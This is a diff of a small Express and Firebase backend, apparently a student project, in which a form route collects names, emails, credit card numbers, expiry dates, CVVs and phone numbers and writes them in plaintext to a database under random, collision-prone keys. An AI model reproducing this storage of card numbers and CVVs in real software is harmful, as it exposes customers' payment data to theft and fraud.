@@ -1,21 +1,24 @@
 // Welcome to Shep's Backend Project. Super Organzied. Everything Commented. Super Readable.
 
 //!-----Imports-----!
-const express = require('express');
-const bodyParser = require('body-parser');
-import { initializeApp } from "firebase/app";
-import { getAnalytics } from "firebase/analytics";
+import express from 'express';
+const data = express();
+import bodyParser from 'body-parser';
+import { initializeApp } from 'firebase/app';
+import { getAnalytics } from 'firebase/analytics';
+import { getDatabase, ref, set } from 'firebase/database';
+//import { getDatabase, ref, set } from "https://sheps-tej4m-default-rtdb.firebaseio.com/";
+
 //const path = require('path');
 
+//Setting Up Express Server 
 
-const data = express();
 data.use(bodyParser.urlencoded({extended: true}));
 
-var server = data.listen(5550, () => {
+  var server = data.listen(5550, () => {
   var host = server.address().address
   var port = server.address().port
-   
-   console.log("Example app listening at http://%s:%s", host, port);
+  console.log("Example app listening at http://%s:%s", host, port);
 })
 
 //FIREBASE!
@@ -32,11 +35,11 @@ const firebaseConfig = {
   measurementId: "G-XY154L261Q"
 };
 
-// Initialize Firebase
+//FIREBASE INIT!!!
 const app = initializeApp(firebaseConfig);
-const analytics = getAnalytics(app);
-
-import { getDatabase, ref, set } from "https://sheps-tej4m-default-rtdb.firebaseio.com/";
+//const analytics = getAnalytics(app);
+//Gets Database from Firebase
+const database = getDatabase();
 
 
 //When Submit is Clicked!
@@ -50,23 +53,22 @@ data.post('/submit-form', async (req, res) => {
   let cvv = req.body.cvv;
   let phone = req.body.phone;
 
+  //Sends information to database!
   sendInformation(email, name, cc, expdate, cvv, phone);
 });
 
-function sendMessage(email, name, cc, expdate, cvv, phone) {
-  const database = getDatabase();
+function sendInformation(email, name, cc, expdate, cvv, phone) {
+  //Math.random is for a random UID between 1 & 10000
+  const userRef = ref(database, 'user/' + Math.floor(Math.random() * 10000));
 
-  //Math is for a random UID between 1 and 10000
-  set(ref(database, 'users/' + Math.floor(Math.random() * 10000)), {
-    name: name,
-    email: email,
-    creditcard: cc,
-    expiredate: expdate,
-    cvv: cvv,
-    phonenumber: phone
-  }).then(() => {
-
-  })
+  set(userRef, {
+    Name: name,
+    Email: email,
+    CreditCard: cc,
+    ExpireDate: expdate,
+    CVV: cvv,
+    PhoneNumber: phone
+  });
 }
 
 
